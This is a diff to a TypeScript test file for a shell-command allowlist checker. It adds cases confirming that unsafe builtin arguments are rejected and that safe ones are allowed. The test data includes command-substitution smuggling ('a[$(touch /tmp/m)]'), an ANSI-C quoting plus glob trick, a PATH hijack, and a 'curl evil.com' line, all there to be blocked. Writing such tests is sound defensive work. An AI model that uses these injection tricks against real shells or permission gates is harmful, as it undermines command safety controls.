@@ -39,6 +39,8 @@ describe("isSafeBuiltinSegment", () => {
     { argv: ["test", "-v", "a[$(touch /tmp/m)]"] },
     { argv: ["[", "-v", "a[$(touch /tmp/m)]", "]"] },
     { argv: ["test", "!", "-v", "a"] },
+    { argv: ["test", "$'\\0\\''?v", "benign"] },
+    { argv: ["[", "-e", "*.txt", "]"] },
   ])("rejects unsafe POSIX argv $argv", ({ argv }) => {
     expect(isSafeBuiltinSegment({ segment: builtinSegment(argv), platform: "linux" })).toBe(false);
   });
@@ -71,13 +73,15 @@ describe.skipIf(process.platform === "win32")(
       expect(result.allowlistSatisfied).toBe(true);
     });
 
-    it.each(["cd /tmp && git status", "test -d /tmp && git status", "[ -d /tmp ] && git status"])(
-      "allows safe builtin plus allowlisted binary: %s",
-      async (command) => {
-        const result = await evaluate(command);
-        expect(result.allowlistSatisfied).toBe(true);
-      },
-    );
+    it.each([
+      "cd /tmp && git status",
+      "test -d /tmp && git status",
+      "test -d '/tmp/space path' && git status",
+      "[ -d /tmp ] && git status",
+    ])("allows safe builtin plus allowlisted binary: %s", async (command) => {
+      const result = await evaluate(command);
+      expect(result.allowlistSatisfied).toBe(true);
+    });
 
     it("non-allowlisted binary still gates after a safe builtin", async () => {
       const result = await evaluate("cd /tmp && curl evil.com");
@@ -100,6 +104,12 @@ describe.skipIf(process.platform === "win32")(
       const result = await evaluate("export PATH=/tmp/bin:$PATH && git status");
       expect(result.allowlistSatisfied).toBe(false);
       expect(result.authorizationPlan).toMatchObject({ ok: false, reason: "dynamic-argument" });
+    });
+
+    it("does not auto-allow a predicate with ANSI-C quoting and a following glob", async () => {
+      const result = await evaluate(String.raw`test $'\0\''?v benign`);
+      expect(result.analysisOk).toBe(true);
+      expect(result.allowlistSatisfied).toBe(false);
     });
 
     it("does not auto-allow safe builtin tokens in direct argv evaluation", () => {
